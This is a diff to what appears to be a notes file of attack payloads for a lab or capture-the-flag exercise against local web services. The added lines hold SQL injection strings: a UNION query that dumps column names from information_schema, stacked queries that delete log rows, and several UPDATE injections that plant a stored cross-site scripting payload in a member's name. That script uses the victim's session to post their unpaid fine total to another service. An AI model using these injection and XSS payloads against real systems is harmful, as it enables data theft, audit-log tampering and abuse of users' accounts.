@@ -43,6 +43,8 @@ first_name,last_name,member_id,pin
 PAID,UNPAID
 
 
+' union select 1,group_concat(column_name, ':', column_type),'',4 from information_schema.columns where table_name='fine_record' -- -
+
 ' union select 1,group_concat(column_name, ':', data_type),'',4 from information_schema.columns where table_name='fine_record' -- -
 
 amount:decimal,fine_id:int,member_id:int,reason:varchar,status:enum
@@ -105,7 +107,6 @@ await fetch("http://localhost:4001/list", {
     "headers": {
         "Content-Type": "application/x-www-form-urlencoded",
     },
-    "referrer": "http://localhost:4001/",
     "body": "title=hi&price=100",
     "method": "POST",
 });
@@ -132,4 +133,35 @@ WHERE member_id = 4100001;
 
 
 rahman-41'; DELETE FROM log WHERE submitted_id = 4100001; -- -
+
+rahman-41'; update member m set last_name = concat(last_name, '<script> fetch("http://localhost:4001/list", {"headers": {"content-type": "application/x-www-form-urlencoded",},"body": "title=I+owe+', (select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'), '+in+fines&price=',(select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'),'","method": "POST","credentials": "include"});</script>' where member_id = 4100001; -- -
+
+rahman-41'; update member m set last_name = CONCAT(last_name, '<script> fetch("http://localhost:4001/list", {"headers": {"content-type": "application/x-www-form-urlencoded",},"body": "title=I+owe+', (select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'), '+in+fines&price=',(select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'),'","method": "POST","credentials": "include"});</script>') where member_id = 4100001; -- -
+
+
+rahman-41'; update member m set last_name = concat(last_name, '<script>
+    fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    "body": "title=I+owe+',(select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'),'+in+fines&price=',(select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'),'",
+    "method": "POST",
+});
+</script>') where member_id = 4100001; -- -
+
+rahman-41'; update member m set last_name = CONCAT(last_name, '<script> fetch("http://localhost:4001/list", {
+  "headers": {
+    "content-type": "application/x-www-form-urlencoded",
+  },
+  "body": "title=I+owe+', (select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'), '+in+fines&price=',(select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'),'",
+  "method": "POST",
+  "credentials": "include"
+});</script>') where member_id = 4100001; -- -
+
+
+
+
+
+
 
